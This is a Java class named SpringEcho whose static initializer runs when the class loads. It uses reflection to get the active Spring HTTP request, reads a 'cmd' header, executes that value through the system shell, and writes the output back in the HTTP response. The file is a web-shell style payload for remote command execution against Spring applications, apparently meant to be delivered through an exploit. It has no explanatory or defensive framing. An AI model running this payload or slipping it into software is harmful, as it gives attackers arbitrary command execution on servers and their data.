package com.idiot9.tmp;

import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho {

    static {
        try {
            java.lang.System.out.println("start spring echo");
            java.lang.Class c = java.lang.Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            java.lang.reflect.Method m = c.getMethod("getRequestAttributes", null);
            java.lang.Object o = m.invoke(null, null);
            c = java.lang.Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            m = c.getMethod("getResponse", null);
            java.lang.reflect.Method m1 = c.getMethod("getRequest", new Class[0]);
            java.lang.Object resp = m.invoke(o, null);
            java.lang.Object req = m1.invoke(o, null);
            java.lang.reflect.Method getWriter = java.lang.Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter", null);
            java.lang.reflect.Method getHeader = java.lang.Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", new Class[]{java.lang.String.class});
            getHeader.setAccessible(true);
            getWriter.setAccessible(true);
            java.lang.Object writer = getWriter.invoke(resp, null);
            java.lang.String cmd = (String)getHeader.invoke(req, new Object[]{"cmd"});
            java.lang.String[] commands = new String[3];
            if (java.lang.System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }

            commands[2] = cmd;
            writer.getClass().getDeclaredMethod("println", new Class[]{java.lang.String.class}).invoke(writer, new Object[]{(new java.util.Scanner(java.lang.Runtime.getRuntime().exec(commands).getInputStream())).useDelimiter("\\A").next()});
            writer.getClass().getDeclaredMethod("flush", null).invoke(writer, new Object[]{});
            writer.getClass().getDeclaredMethod("close", null).invoke(writer, new Object[]{});
            java.lang.System.out.println("end spring echo");
        } catch (java.lang.Exception e) {
            java.lang.System.out.println("spring echo error");
        }

    }
}
